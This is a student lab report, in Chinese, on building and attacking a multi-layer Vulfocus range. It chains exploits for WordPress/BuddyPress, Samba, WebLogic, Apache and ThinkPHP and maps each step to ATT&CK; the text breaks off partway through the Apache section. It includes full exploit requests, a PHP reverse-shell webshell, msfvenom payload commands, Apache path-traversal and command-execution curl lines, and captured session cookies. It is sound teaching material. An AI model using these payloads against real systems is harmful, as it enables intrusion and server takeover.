# 网安实践：下半场总流程

## 小组成员及分工
**尚佳慧**：负责镜像选择与靶场设计，进行镜像测试，Attack Navigator 标注，以及报告汇总。

**孙瑢杉**：进行镜像测试，对入口靶标进行攻击与利用检测，入口漏洞缓解。 

**张灿** :  全链路攻击

**丁梦**：对第一层和第二层的四个靶标进行利用检测。 

**陈朗**：对第三层的一个靶标进行利用检测，入口漏洞的缓解。 

**杨宇婷**：入口漏洞的缓解与修复

### 🏆 靶场建设任务完成报告 🏆
```diff
+ 所有任务 100% 完成 +
```

| 任务描述         | 状态   | 进度可视化               |
|------------------|--------|--------------------------|
| 🌐 内部子网搭建   | ✅  | ██████████ 100% |
| 🎯 靶标更换部署   | ✅  | ██████████ 100% | 
| 🔗 攻击链路验证   | ✅  | ██████████ 100% |
| 🔍 漏洞利用检测   | ✅  | ██████████ 100% |
| 🛡️ 漏洞缓解策略   | ✅  | ██████████ 100% | 
| ✨ 漏洞完全修复   | ✅  | ██████████ 100% |
| 📊 ATT&CK可视化   | ✅  | ██████████ 100% | 


## 实验环境

* kali

* metasploit

* docker

* vulficus

# 自定义靶场设计
在设计靶场时，我们的目标如下：
* 构建多网段、有隔离策略的网络环境（内网、外网、DMZ）
* 涵盖像“初始访问”“横向移动”等环节
* 支持红队完成多条攻击链（初始访问、提权、横移、持久化等）
* 支持蓝队全程检测、监控、溯源（流量、日志、告警）


我们先启动vulfocus镜像。

![alt text](./image/1748090564315.png)

接下来我们选择符合要求，能够成功启动，同时具有易于攻击的特性的镜像。通过询问大模型，我们在vulfocus上拉取数个镜像进行测试。

经过启动测试，排除掉了一些无法正常启动的镜像，最后选择如下的镜像进行拓扑搭建。

同时，我们设计网卡如下：

![alt text](./image/1748091359862.png)

![alt text](./image/1748091090316.jpg)

![alt text](./image/1748223841631.png)

## 涉及漏洞概览

| 阶段   | 容器镜像              | 漏洞类型        | 利用方式            |
| ---- | ----------------- | ----------- | --------------- |
| 初始   | wordpress_cve-2021-21389     | 垂直越权漏洞      | 获取高权限后台控制       |
| 横向移动 | vulshare_nginx-php-flag | 文件上传/共享漏洞   | 上传工具，信息泄露、辅助提权  |
| 横向移动 | samba-cve_2017_7494          | 远程命令执行漏洞    | 加载恶意共享文件，远程代码执行 |
| 核心渗透 | weblogic-cve_2019_2725  | 远程代码执行（RCE） | 任意命令执行，控制中间件容器  |
| 核心渗透 | apache-cve_2021_41773 | 远程命令执行（RCE） | 命令执行，深入主机       |
| 深度渗透 | thinkphp-cve_2018_1002015    | 命令执行漏洞      | 执行命令，访问数据库或持久控制 |

测试是否能够正常启动，待我们编排好的场景发布后，尝试启动场景，可以成功启动即为成功。

![alt text](./image/1748089490210-1.png)

## Attack Navigator可视化

![alt text](./image/02b7151196cffe900f96f4f7aeb7f5d.png)

**可见json文件。**

### 具体技术点解释

#### 入口靶标：wordpress_cve-2021-21389:latest

  **第一阶段：注册绕过（逻辑漏洞利用）**

**抓包注册请求 → 提取激活密钥 → 构造激活请求**

* **T1190 – Exploit Public-Facing Application**
  WordPress 注册逻辑存在缺陷，允许攻击者绕过激活验证，属于典型公共 Web 应用利用。

* **T1556.003 – Modify Authentication Process: Web Portal Capture**
  构造激活请求、绕过标准验证流程，属于认证逻辑篡改。

* **T1071.001 – Application Layer Protocol: Web**
  使用 HTTP 抓包与重放攻击（burp suite 操作）均基于 Web 协议通信。

---

**第二阶段：获取管理员权限（权限提升）**

**创建用户组 → 访问 `/groups/create/...` 创建组 → 用户被加入组**

* **T1098.001 – Account Manipulation: Additional Cloud Credentials / Privilege Grant**
  创建组的过程中，攻击者将自己的账户植入特定权限组，触发权限提升逻辑。

---

**抓包 manage/members 请求 → 提取 X-WP-Nonce 与 Cookie 参数**

* **T1557.002 – Man-in-the-Middle: ARP Cache Poisoning / Traffic Interception**
  虽然不是典型的网络中间人，但抓包工具（如 Burp）本质上拦截了用户与 Web 应用间通信。

* **T1110.001 – Brute Force: Password Guessing (弱匹配)**
  非常轻微适用：使用暴力方式猜测非标准接口参数或 token（如尝试获取 X-WP-Nonce）

---

**构造 POST 请求 → `wp-json/buddypress/v1/members/me` → 提权**

* **T1068 – Exploitation for Privilege Escalation**
  构造提权请求属于利用应用内部的权限漏洞直接获取更高权限。

* **T1078.003 – Valid Accounts: Local Accounts**
  利用有效用户身份 + X-WP-Nonce 提权。

---

**登录后台验证提权效果 → 访问 dashboard 页面**

* **T1087.001 – Account Discovery: Local Account**
  登录后确认账户权限是否为 admin，即是对本地账户权限的探测行为。

---

| Technique ID | Technique Name                                     | 阶段          | 说明                     | 推荐颜色      |
| ------------ | -------------------------------------------------- | ----------- | ---------------------- | --------- |
| T1190        | Exploit Public-Facing Application                  | 注册绕过        | WordPress 激活流程漏洞利用     | `#ff9999` |
| T1556.003    | Modify Authentication Process: Web Portal Capture  | 注册绕过        | 伪造激活请求绕过验证流程           | `#ffcc99` |
| T1071.001    | Application Layer Protocol: Web                    | 注册/提权请求发送阶段 | 所有 burp 操作通过 HTTP 接口构造 | `#cccccc` |
| T1098.001    | Account Manipulation: Additional Cloud Credentials | 创建用户组       | 利用分组机制将用户权限抬升          | `#66cccc` |
| T1557.002    | Man-in-the-Middle: Traffic Interception            | 抓包提权请求      | Burp 抓包拦截 token 信息     | `#ffdd99` |
| T1068        | Exploitation for Privilege Escalation              | 构造提权请求      | 用接口漏洞提升角色为管理员          | `#ffa07a` |
| T1078.003    | Valid Accounts: Local Accounts                     | 登录后台        | 使用已有账户访问管理后台           | `#ffff99` |
| T1087.001    | Account Discovery: Local Account                   | 权限验证        | 验证 dashboard 页面功能是否新增  | `#ccffcc` |

---

#### 第一层靶标：samba-cve_2017_7494:latest

利用metasploit。

| 步骤 | 操作说明                                                                         |
| -- | ---------------------------------------------------------------------------- |
| ①  | 利用 `exploit/linux/samba/is_known_pipename` 模块触发漏洞                            |
| ②  | 设置 payload相关参数 |
| ③  | 启动监听器，获取反弹 shell（Meterpreter / Bash / Netcat）                                |
| ④  | 在 shell 中执行命令、提权、持久化                                                         |

---

| Technique ID  | Technique Name                                                  | 阶段       | 说明                                                  |
| ------------- | --------------------------------------------------------------- | -------- | --------------------------------------------------- |
| **T1203**     | **Exploitation for Client Execution**                           | 执行       | Metasploit 利用漏洞模块（比如 `samba/is_known_pipename`）进行触发 |
| **T1059.004** | **Command and Scripting Interpreter: Unix Shell**               | 执行       | 获取 shell 后，通过 Unix shell 执行命令                       |
| **T1053.003** | **Scheduled Task/Job: Cron**                                  | 权限维持 | 攻击者可创建 cron 持久化任务（如反弹 shell 持续存在）                   |

---

#### 第一层靶标：vulshare_nginx-php-flag

**攻击技术点**

| ATT\&CK 技术 ID | 技术名称                                                 | 攻击阶段 | 行为描述                               |
| ------------- | ---------------------------------------------------- | ---- | ---------------------------------- |
| **T1203**     | Exploitation for Client Execution                    | 执行   | 直接通过 `cmd` 参数触发命令执行漏洞              |
| **T1059.001** | Command and Scripting Interpreter: PowerShell / Bash | 执行   | 在 URL 参数中执行 Linux 命令（如 `ls`、`cat`） |
| **T1040**     | Network Sniffing                                     | 侦察   | 可以在容器内抓取访问日志或包来检测攻击行为              |
| **T1595.002** | Active Scanning: Vulnerability Scanning              | 侦察   | 攻击者可能通过 Fuzz 发现 index.php 接收参数     |

---

#### 第二层靶标： WebLogic – CVE-2020-2555

* 探测 WebLogic 控制台端口
* 构造 T3 反序列化 Payload 获取反弹 Shell 或 flag
* 监听并分析网络流量、日志确认利用是否成功

| ATT\&CK 技术 ID | 技术名称                                            | 阶段   | 说明                              |
| ------------- | ----------------------------------------------- | ---- | ------------------------------- |
| **T1190**     | Exploit Public-Facing Application               | 初始访问 | 通过反序列化漏洞攻击 WebLogic             |
| **T1059.005** | Command and Scripting Interpreter: Visual Basic | 执行   | 利用 T3 Payload 执行恶意命令            |
| **T1210**     | Exploitation of Remote Services                 | 横向移动 | 若攻击者通过反弹 Shell 获取控制权限，可进一步攻击内网  |
| **T1040**     | Network Sniffing                                | 侦察   | Wireshark 抓包分析是否存在 T3 通信或恶意命令流量 |
| **T1005**     | Data from Local System                          | 收集   | 读取 flag 文件作为靶场目标                |
| **T1057**     | Process Discovery                               | 发现   | 若攻击者探测运行服务、进程等信息                |

---

#### 第二层靶标：Apache – CVE-2021-41773

* 使用 curl http://ip:port/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd 进行路径穿越读取
* 使用同样方式远程执行命令：如 curl 'http://ip/cgi-bin/.%2e/.%2e/.%2e/bin/sh -c "cat /flag"'
* 在服务器端分析 apache 访问日志，使用 tail -f access_log | grep ".."

###  ATT\&CK Navigator 标注：

| ATT\&CK 技术 ID | 技术名称                                            | 阶段   | 说明                       |
| ------------- | ----------------------------------------------- | ---- | ------------------------ |
| **T1190**     | Exploit Public-Facing Application               | 初始访问 | Apache 路径穿越与命令执行         |
| **T1083**     | File and Directory Discovery                    | 发现   | 使用路径穿越漏洞查看服务器文件系统结构      |
| **T1059.004** | Command and Scripting Interpreter: Unix Shell   | 执行   | 执行如 `cat /flag` 命令获取敏感数据 |
| **T1040**     | Network Sniffing                                | 侦察   | 使用 Wireshark 抓取请求        |
| **T1005**     | Data from Local System                          | 收集   | 读取 flag 文件               |


#### 最终层靶标：vulfocus/thinkphp-cve_2018_1002015 —— ThinkPHP 框架远程代码执行

| ATT\&CK 技术 ID | 技术名称                                          | 攻击阶段 | 行为描述                               |
| ------------- | --------------------------------------------- | ---- | ---------------------------------- |
| **T1190**     | Exploit Public-Facing Application             | 初始访问 | RCE 利用的是公开服务接口（ThinkPHP 路由解析漏洞）    |
| **T1059.004** | Command and Scripting Interpreter: Unix Shell | 执行   | 构造 Payload 执行命令                    |
| **T1082**     | System Information Discovery                  | 发现   | 使用 `id`、`whoami`、`uname` 等命令确认执行身份 |
| **T1005**     | Data from Local System                        | 收集   | 读取本地 `flag` 文件属于敏感信息获取             |




## 各镜像单独启动测试
**1. wordpress_cve-2021-21389:latest（wordpress垂直越权）**
* CVE-2021-21389 是 WordPress 核心代码中一个因权限验证不严导致的垂直越权漏洞。攻击者可以通过此漏洞以低权限用户身份执行本应仅限管理员或高权限用户的操作。

* BuddyPress 是一个用于构建社区站点的WordPress插件。当BuddyPress处于5.0.0-7.2.1时，非特权用户可以通过利用REST API 成员端点（BuddyPress中用于管理成员数据的API接口）中的问题来获得管理员权限。

![alt text](./image/1748185515738.png)

**2. c4pr1c3/vulshare_nginx-php-flag:latest**
* 命令执行（Command Execution）漏洞，即黑客可以直接在Web应用中执行系统命令，从而获取敏感信息或者拿下shell权限 命令执行漏洞可能造成的原因是Web服务器对用户输入命令安全检测不足，导致恶意代码被执行。

![alt text](./image/1748185720519.png)

**3. vulfocus/samba-cve_2017_7494:latest**

* Samba实现Windows主机与Linux服务器之间的资源共享，Linux操作系统提供了Samba服务，Samba服务为两种不同的操作系统架起了一座桥梁，使Linux系统和Windows系统之间能够实现互相通信。samba在linux系统上实现SMB协议的服务，使用SMB协议在局域网上共享文件和打印机.CVE-2017-7494，2017年5月24日Samba发布了4.6.4版本，修复严重的远程代码执行漏洞，该漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本，可以让恶意访问者远程控制受影响的Linux和Unix机器。

* 此镜像模拟的是Samba漏洞服务，而Samba是SMB文件共享服务，并非网页服务，因此不能直接通过网页访问确认是否可以成功启动。

我们进入容器内部，查看是否存在smbd或者nmbd进程。
![alt text](./image/1748186147419.png)


**4. vulfocus/weblogic-cve_2019_2725:latest**
* CVE-2019-2725 是一个影响 Oracle WebLogic Server 的反序列化远程代码执行漏洞。这个漏洞允许未经授权的攻击者通过发送精心构造的恶意 HTTP 请求来远程执行命令。该漏洞利用了 WebLogic 的 XMLDecoder 反序列化漏洞，通过构造特定的 payload 来绕过 Oracle 官方的补丁。

**5. vulfocus/apache-cve_2021_41773:latest**

* Apache HTTP Server 2.4.49、2.4.50版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到Web目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。

![alt text](./image/1748185876491.png)

**6. vulfocus/thinkphp-cve_2018_1002015:latest**
* ThinkPHP 5.0.x版本和5.1.x版本中存在远程代码执行漏洞，该漏洞源于ThinkPHP在获取控制器名时未对用户提交的参数进行严格的过滤。远程攻击者可通过输入‘＼’字符的方式调用任意方法利用该漏洞执行代码。

![alt text](./image/1748186644232.png)


# 攻击总流程

### 步骤一：入口靶标攻击（WordPress 垂直越权（CVE-2021-21389）漏洞复现）

* BuddyPress 是一个用于构建社区站点的开源 WordPress 插件。在 7.2.1 之前的 5.0.4 版本的 BuddyPress 中，非特权普通用户可以通过利用 REST API 成员端点中的问题来获得管理员权限。该漏洞已在 BuddyPress 7.2.1 中修复。插件的现有安装应更新到此版本以缓解问题。

#### （一）环境搭建
1. **拉取所需镜像**
   ```bash
   docker pull vulfocus/wordpress_cve-2021-21389:latest
   docker pull vulfocus/thinkphp-cve_2018_1002015:latest
   docker pull vulfocus/samba-cve_2017_7494:latest 
   docker pull c4pr1c3/vulshare_nginx-php-flag:latest
   docker pull vulfocus/apache-cve_2021_41773
   docker pull vulfocus/weblogic-cve_2020_2555
   ```
   ![1747473863077](image/homework/1747473863077.png)
   ![1747473881917](image/homework/1747473881917.png)
   ![1747473893030](image/homework/1747473893030.png)
   ![1747473905026](image/homework/1747473905026.png)
   ![1747648013574](image/homework/1747648013574.png)

2. **启动vulfucus环境**
![1747896129453](image/readme/1747896129453.png)
![1747896152092](image/readme/1747896152092.png)

3. **场景搭建&启动场景**
![1748168018019](image/readme/1748168018019.png)

4. **打开浏览器，访问场景地址**
![1747897882478](image/readme/1747897882478.png)

#### （二）注册绕过
1. **抓包注册请求**
   - 使用 Burp Suite 抓包。
   ![1747897930858](image/readme/1747897930858.png)
   - 点击`send to repeater`，构造 POST 请求，发送到 `/wp-json/buddypress/v1/signup`。
   - 请求体如下：
     ```json
     {
       "user_login": "attacker1",
       "user_email": "attacker1@163.com",
       "user_name": "attacker1",
       "password": "attacker1"
     }
     ```
    - 最终构造的请求包：
        ```
        POST /wp-json/buddypress/v1/signup HTTP/1.1
        Host: 192.168.20.12:10459
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
        Content-Type: application/json; charset=UTF-8
        Content-Length: 112

        {"user_login": "attcker1", "user_email": "attacker1@163.com", "user_name": "attacker1", "password": "attacker1"}
        ```

    - 替换 `Host` 为自己的 IP 和端口。
    - 得到回显:
        ```
         HTTP/1.1 200 OK
         Date: Thu, 22 May 2025 03:48:36 GMT
         Server: Apache/2.4.18 (Ubuntu)
         X-Robots-Tag: noindex
         Link: <http://192.168.20.12:10459/wp-json/>; rel="https://api.w.org/"
         X-Content-Type-Options: nosniff
         Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
         Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
         Allow: POST
         Content-Length: 280
         Content-Type: application/json; charset=UTF-8
         [{"id":3,"user_login":"attcker1","registered":"2025-05-22T03:48:36","user_name":"attacker1","activation_key":"aoM0svmO72kVVPbNxYadAKifjIUuYqj8","user_email":"attacker1@163.com","date_sent":"2025-05-22T03:48:36","count_sent":1,"meta":{"field_1":"attacker1","profile_field_ids":1}}]
         ```
2. **提取激活密钥**
   - 发送请求后，服务器会返回一个响应包，其中包含 `activation_key`。
   ![1747885758997](image/homework/1747885758997.png)
   `activation_key` : `aoM0svmO72kVVPbNxYadAKifjIUuYqj8`
   - 提取 `activation_key`，用于后续的激活操作。

3. **构造激活请求**
   - 使用提取的 `activation_key` 构造 PUT 请求，发送到 `/wp-json/buddypress/v1/signup/activate/<activation_key>`。
   ![1747885790638](image/homework/1747885790638.png)
   - 请求体与注册请求相同。
   - 完整请求包：
        ```
        PUT /wp-json/buddypress/v1/signup/activate/aoM0svmO72kVVPbNxYadAKifjIUuYqj8 HTTP/1.1
        Host:192.168.20.12:10459
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
        Content-Type: application/json; charset=UTF-8
        Content-Length: 112
        {"user_login": "attcker1", "user_email": "attacker1@163.com", "user_name": "attacker1", "password": "attacker1"}
        ```
    - **得到回显:**
        ```
        HTTP/1.1 200 OK
        Date: Thu, 22 May 2025 03:49:29 GMT
        Server: Apache/2.4.18 (Ubuntu)
        X-Robots-Tag: noindex
        Link: <http://192.168.20.12:10459/wp-json/>; rel="https://api.w.org/"
        X-Content-Type-Options: nosniff
        Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
        Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
        Content-Length: 280
        Content-Type: application/json; charset=UTF-8
        [{"id":3,"user_login":"attcker1","registered":"2025-05-22T03:48:36","user_name":"attacker1","activation_key":"aoM0svmO72kVVPbNxYadAKifjIUuYqj8","user_email":"attacker1@163.com","date_sent":"2025-05-22T03:48:36","count_sent":1,"meta":{"field_1":"attacker1","profile_field_ids":1}}]
        ```

4. **登录验证**
   - 使用注册的账号 `attacker1` 和密码 `attacker1` 登录。
   
   ![1747885902130](image/homework/1747885902130.png)
   - 登录后，用户将获得普通用户权限，但尚未获得管理员权限。
   ![1747885938881](image/homework/1747885938881.png)
   ![1748069641307](image/readme/1748069641307.png)

#### （三）获取管理员权限
1. **创建用户组**
   - 访问 `http://<your_ip>:<your_port>/groups/create/step/group-details/`。
   - 填写组信息并完成创建。
   - 通过创建用户组，用户将被添加到该组中，为后续的权限提升做准备。
    ![1747888798026](image/homework/1747888798026.png)
    ![1747888866380](image/homework/1747888866380.png)
    ![1747888878196](image/homework/1747888878196.png)
    ![1747888898177](image/homework/1747888898177.png)
    ![1747888916532](image/homework/1747888916532.png)
    ![1747888936571](image/homework/1747888936571.png)
2. **抓取关键参数**
   - 点击 `manage`，再点击 `members`，使用抓包工具抓取请求。
   - 提取请求中的 `X-WP-Nonce` 和 `Cookie` 参数。
   ![1747889012605](image/homework/1747889012605.png)
    **cookie:**
        ```
        grafana_session=7cee305b146bf89decccac3eb414687f; grafana_session_expiry=1747723015; zbx_sessionid=060b0abb1800d98452c40e735dbb58fa; wp-settings-time-2=1747822280; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzRZVGcyWlRWakxUa3dZamN0TkRNMFl5MDVaREF4TFdZME5EZ3haVFptTVdNd01TST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--a69a8d8efbbef8037dbb261a0526aae27fb6c1b8; metabase.DEVICE=0af33864-c7aa-43fd-89aa-287250f4c715; vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQ3OTY5MjYzLCJlbWFpbCI6IiJ9.C9VdlIBrcP4xj1g5TzsBWQosumWuAVXLH1S6Lgzk8nI; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_8232bb51e9fa6ae4bed9f94b4ce661c2=attcker1%7C1748062618%7CGvjHpcyFfFhCylwuqLNafXmiHwJqmZ5VldxGcUkR0Bz%7Ca6226440d0bde4fe9d4cf14cce8fcf49dd365c9f342c5296f67044f265433248; wp-settings-time-3=1747889821
        ```
        **X-WP-Nonce:** ``cb16f80772``

3. **构造提权请求**
   - 使用提取的 `X-WP-Nonce` 和 `Cookie` 构造 POST 请求，发送到 `/wp-json/buddypress/v1/members/me`。
   - 请求体如下：
     ```json
     {"roles": "administrator"}
     ```
   - 完整请求包：
        ```http
        POST /wp-json/buddypress/v1/members/me HTTP/1.1
        Host:192.168.20.12:10459
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
        X-WP-Nonce: cb16f80772
        Cookie: grafana_session=7cee305b146bf89decccac3eb414687f; grafana_session_expiry=1747723015; zbx_sessionid=060b0abb1800d98452c40e735dbb58fa; wp-settings-time-2=1747822280; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzRZVGcyWlRWakxUa3dZamN0TkRNMFl5MDVaREF4TFdZME5EZ3haVFptTVdNd01TST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--a69a8d8efbbef8037dbb261a0526aae27fb6c1b8; metabase.DEVICE=0af33864-c7aa-43fd-89aa-287250f4c715; vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQ3OTY5MjYzLCJlbWFpbCI6IiJ9.C9VdlIBrcP4xj1g5TzsBWQosumWuAVXLH1S6Lgzk8nI; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_8232bb51e9fa6ae4bed9f94b4ce661c2=attcker1%7C1748062618%7CGvjHpcyFfFhCylwuqLNafXmiHwJqmZ5VldxGcUkR0Bz%7Ca6226440d0bde4fe9d4cf14cce8fcf49dd365c9f342c5296f67044f265433248; wp-settings-time-3=1747889821SS
        Content-Type: application/json; charset=UTF-8
        Content-Length: 28
        {"roles": "administrator"}
        ```
     ![1747890470194](image/homework/1747890470194.png)
     ![1747890494107](image/homework/1747890494107.png)

4. **验证提权结果**
   - 发送请求后，用户角色将被提升为管理员。
   - 再次登录 WordPress 后台，验证是否获得管理员权限，发现 dashboard 页面功能增加。
   ![1747890528150](image/homework/1747890528150.png)

#### （四）上传木马，获取 Shell
1. **上传木马文件**
   - 在 WordPress 后台，点击 `Plugins` 模块，选择 `Add New`。
   ![1747890547884](image/homework/1747890547884.png)
   ![1747890578223](image/homework/1747890578223.png)
   - 点击 `Upload Plugin`，上传包含一句话木马的 PHP 文件。
   ![1747890605964](image/homework/1747890605964.png)
   - 木马文件内容如下：
        ```php
        <?php
        $sock = fsockopen("192.168.168.10", 4444);
        $proc = proc_open("bash -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
        ?>
        ```
        ![1747890820999](image/homework/1747890820999.png)
2. **验证木马执行**
   - 上传成功后，访问 `/wp-content/uploads/<year>/<month>/c.php`。
    ![1747890861599](image/homework/1747890861599.png)
    ![1747890872341](image/homework/1747890872341.png)
   **第一种方法 :**
      - 通过 URL 参数 `cmd` 执行系统命令，例如：
         ```
         http://<your_ip>:<your_port>/wp-content/uploads/2025/05/c.php?cmd=id
         ```
      - 如果返回用户 ID 信息，则说明木马执行成功，获得了 Shell。
      ![1747891827132](image/homework/1747891827132.png)
      ![1747891841145](image/homework/1747891841145.png)
      - 由此,我们找到/tmp目录下的flag,将其输入到场景flag中,成功得分
      flag为`flag-{bmh9a8fd407-0aac-4b54-995d-4bb306a739f5}`
      ![1747891890594](image/homework/1747891890594.png)
   **第二种方法 :**
      - 我们也可以用 metasploit 获取反弹 shell
      ![1747893446502](image/homework/1747893446502.png)
      ![1747893462723](image/homework/1747893462723.png)


### 步骤二 设立立足点并发现靶标2-3

1. 在攻击者主机上生成meterpreter.elf文件
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<攻击者主机IP> LPORT=<端口> -f elf > meterpreter.elf`，通过上一层攻击中涉及的文件上传漏洞上传我们的meterpreter.elf文件。
<br>![](./pics/手动生成meterpretershell.png)<br>
2. 上传文件（要求完成入口靶标的提权行为）
![](./pics/上传成功.png)<br>

3. 攻击者主机，在metasploit里设置如下并`run -j`等待

```bash
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost <攻击者主机IP>
set lport <端口>
run -j
```

注意，这里的IP和端口要和生成.elf文件时设置的一样

5. 在靶机上进入入口靶标的容器，在靶机里运行meterpreter.elf
![](./pics/进入容器下载文件并运行.png)<br>

6. 返回到攻击者主机，可以看到连接成功
![](./pics/拿到meterpretershell.png)<br>

7. 升级shell
`sessions -u <会话编号>`
![](./pics/升级会话窗口.png)<br>

8. 进入新开启的会话，查看route，arp， ipconfig
`sessions -i <会话编号>`
![](./pics/查看arp.png)<br>
![](./pics/查看route.png)<br>
![](./pics/ipconfig.png)<br>

9. 设置pivot路由
![](./pics/添加pivot路由3.png)<br>

10. 扫描
```bash
search portscan
use 0
set rhosts <ip>
set ports <ports>
set threads 10
run
```
![](./pics/扫描结果1.png)<br>
扫描100%后查看存活的主机和服务，使用`hosts`和`services`
![](./pics/开放的主机和服务.png)<br>

11. 设置代理
参照[教学课件](https://c4pr1c3.github.io/cuc-ns-ppt/vuls-awd.md.v4.html#/%E5%BB%BA%E7%AB%8B%E7%AB%8B%E8%B6%B3%E7%82%B9%E5%B9%B6%E5%8F%91%E7%8E%B0%E9%9D%B6%E6%A0%872-4)和视频
![](./pics/socks代理.png)<br>
![](./pics/查看1080端口服务开放情况.png)<br>
`cat /etc/proxychains4.conf` 
确认有以下配置
![](./pics/修改proxychains配置.png)<br>
并且配置浏览器代理,方便直接从浏览器访问网页
![](./pics/代理3.png)<br>

### 步骤三 靶标2-3攻破

#### samba
* Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。SMB（Server Messages Block，信息服务块）是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。SMB协议是客户机/服务器型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。通过设置“NetBIOS over TCP/IP”使得Samba不但能与局域网络主机分享资源，还能与全世界的电脑分享资源。

* 2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本,，确认属于严重漏洞，可以造成远程代码执行。

1. 根据扫描结果搜索可用攻击模块并选择合适的模块，设置合适的options，进行攻击

```bash
search semba type:exploit
use exploit/linux/samba/is_know_pipname
# 设置options，可以使用show options查看需要设置的内容
# 执行攻击
run
```

![alt text](./pics/meta-samba.png)

2. get flag

![](./pics/getflag3.png)<br>

#### nginx

1. 设置代理curl扫描到的IP
`proxychains curl http://192.170.84.2`
![](./pics/访问第二台主机.png)<br>

2. 根据提示执行以下命令
`proxychains curl http://<目标IP>/index.php?cmd=ls%20/tmp`
![](./pics/第二个flag.png)<br>



### 步骤四 设立pivot路由并发现靶标4-5

1. 查看第一层两台主机的ip

![](./pics/双网卡1.png)<br>
可以看到192.170.84.4这一台机器有双网卡

2. 升级对应的shell
![](./pics/升级shell1.png)<br>

3. 设置pivot路由
![](./pics/添加pivot路由3.png)<br>

### 步骤五 靶标4-5攻破

#### weblogic

```bash
search cve-2019-2725
use 0
set Proxies socks5:127.0.0.1:1080
# 设置靶机IP等
# 例：
# set rhosts 192.169.85.3
# 设置完成以后再进行攻击
run
```
会话窗口开启以后，进入shell，输入ls /tmp
![](./pics/拿到flag3.png)

#### apache

#### 1. 启动靶机环境

![1748153067964](image/第一层两靶标攻击与利用检测/1748153067964.png)

#### 2. 信息收集

##### 2.1 基础端口扫描

```bash
# 扫描 Apache 服务端口
nmap -sV -p 80,443,8080-8090 10.37.133.3
```

**扫描结果**:

```
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ nmap -sV -p 80,443,8080-8090 10.37.133.3

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 02:03 EDT
Nmap scan report for kali-linux.host-only--3 (10.37.133.3)
Host is up (0.0000020s latency).

PORT     STATE    SERVICE         VERSION
80/tcp   filtered http
443/tcp  closed   https
8080/tcp closed   http-proxy
8081/tcp closed   blackice-icecap
8082/tcp closed   blackice-alerts
8083/tcp closed   us-srv
8084/tcp closed   websnp
8085/tcp closed   unknown
8086/tcp closed   d-s-n
8087/tcp closed   simplifymedia
8088/tcp closed   radan-http
8089/tcp closed   unknown
8090/tcp closed   opsmessaging

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
```

![1748153021142](./image/第一层两靶标攻击与利用检测/1748153021142.png)

**扫描结果分析**：

- 常规HTTP端口(80, 443, 8080-8090)均显示为关闭或过滤状态
- Apache服务运行在非标准端口上，通过Vulfocus平台动态分配为**13503端口**
- 需要直接访问指定的映射端口进行后续信息收集

##### 2.2 Web 服务识别

通过浏览器访问 Apache 服务 `http://10.37.133.3:42286`。

![1748152989670](image/第一层两靶标攻击与利用检测/1748152989670.png)

##### 2.3 Apache 版本检测

```bash
# 使用 curl 获取服务器信息
curl -I http://10.37.133.3:42286

# 使用 nikto 进行 Web 扫描
nikto -h http://10.37.133.3:42286
```

![1748153862204](image/第一层两靶标攻击与利用检测/1748153862204.png)

**curl响应头分析**:

```bash
